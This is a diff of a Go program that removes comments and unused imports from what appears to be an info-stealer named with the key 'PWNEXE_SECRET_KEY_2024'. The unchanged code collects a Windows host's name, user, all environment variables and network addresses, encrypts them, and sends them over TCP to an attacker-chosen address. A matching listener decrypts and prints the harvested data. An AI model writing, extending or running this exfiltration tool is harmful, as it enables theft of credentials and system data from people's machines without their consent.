@@ -4,7 +4,6 @@ import (
 	"crypto/aes"
 	"crypto/cipher"
 	"crypto/rand"
-	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"io"
@@ -12,7 +11,6 @@ import (
 	"log"
 	"net"
 	"os"
-	"strconv"
 	"strings"
 	"time"
 )
@@ -34,7 +32,6 @@ type SystemData struct {
 var encryptionKey []byte
 
 func init() {
-	// Generate a fixed encryption key for consistency
 	key := "PWNEXE_SECRET_KEY_2024"
 	hash := make([]byte, 32)
 	for i := 0; i < 32; i++ {
@@ -88,7 +85,6 @@ func collectSystemData() *SystemData {
 		Environment: make(map[string]string),
 	}
 	
-	// Basic system info
 	data.Hostname, _ = os.Hostname()
 	data.Username = os.Getenv("USERNAME")
 	data.ComputerName = os.Getenv("COMPUTERNAME")
@@ -97,7 +93,6 @@ func collectSystemData() *SystemData {
 	data.ProgramFiles = os.Getenv("PROGRAMFILES")
 	data.CurrentDir, _ = os.Getwd()
 	
-	// Environment variables
 	for _, env := range os.Environ() {
 		pair := strings.SplitN(env, "=", 2)
 		if len(pair) == 2 {
@@ -105,7 +100,6 @@ func collectSystemData() *SystemData {
 		}
 	}
 	
-	// Network interfaces
 	addrs, err := net.InterfaceAddrs()
 	if err == nil {
 		for _, addr := range addrs {
@@ -117,36 +111,30 @@ func collectSystemData() *SystemData {
 		}
 	}
 	
-	// Simplified process list (just a placeholder)
 	data.Processes = []string{"system_data_collected"}
 	
 	return data
 }
 
 func sendDataToTarget(targetIP, targetPort string) error {
-	// Collect system data
 	systemData := collectSystemData()
 	
-	// Convert to JSON
 	jsonData, err := json.Marshal(systemData)
 	if err != nil {
 		return fmt.Errorf("failed to marshal data: %v", err)
 	}
 	
-	// Encrypt the data
 	encryptedData, err := encrypt(jsonData)
 	if err != nil {
 		return fmt.Errorf("failed to encrypt data: %v", err)
 	}
 	
-	// Connect to target
 	conn, err := net.Dial("tcp", targetIP+":"+targetPort)
 	if err != nil {
 		return fmt.Errorf("failed to connect to %s:%s: %v", targetIP, targetPort, err)
 	}
 	defer conn.Close()
 	
-	// Send data length first (8 bytes)
 	dataLen := len(encryptedData)
 	lenBytes := make([]byte, 8)
 	for i := 0; i < 8; i++ {
@@ -158,7 +146,6 @@ func sendDataToTarget(targetIP, targetPort string) error {
 		return fmt.Errorf("failed to send data length: %v", err)
 	}
 	
-	// Send the encrypted data
 	_, err = conn.Write(encryptedData)
 	if err != nil {
 		return fmt.Errorf("failed to send data: %v", err)
@@ -194,7 +181,6 @@ func handleConnection(conn net.Conn) {
 	
 	fmt.Printf("[+] New connection from %s\n", conn.RemoteAddr().String())
 	
-	// Read data length (8 bytes)
 	lenBytes := make([]byte, 8)
 	_, err := io.ReadFull(conn, lenBytes)
 	if err != nil {
@@ -202,13 +188,11 @@ func handleConnection(conn net.Conn) {
 		return
 	}
 	
-	// Convert length bytes to int
 	var dataLen int64
 	for i := 0; i < 8; i++ {
 		dataLen |= int64(lenBytes[i]) << (i * 8)
 	}
 	
-	// Read the encrypted data
 	encryptedData := make([]byte, dataLen)
 	_, err = io.ReadFull(conn, encryptedData)
 	if err != nil {
@@ -216,14 +200,12 @@ func handleConnection(conn net.Conn) {
 		return
 	}
 	
-	// Decrypt the data
 	decryptedData, err := decrypt(encryptedData)
 	if err != nil {
 		fmt.Printf("[-] Failed to decrypt data: %v\n", err)
 		return
 	}
 	
-	// Parse JSON data
 	var systemData SystemData
 	err = json.Unmarshal(decryptedData, &systemData)
 	if err != nil {
@@ -231,7 +213,6 @@ func handleConnection(conn net.Conn) {
 		return
 	}
 	
-	// Display the received data
 	fmt.Printf("\n[+] Received system data from %s:\n", conn.RemoteAddr().String())
 	fmt.Printf("    Timestamp: %s\n", time.Unix(systemData.Timestamp, 0).Format("2006-01-02 15:04:05"))
 	fmt.Printf("    Hostname: %s\n", systemData.Hostname)
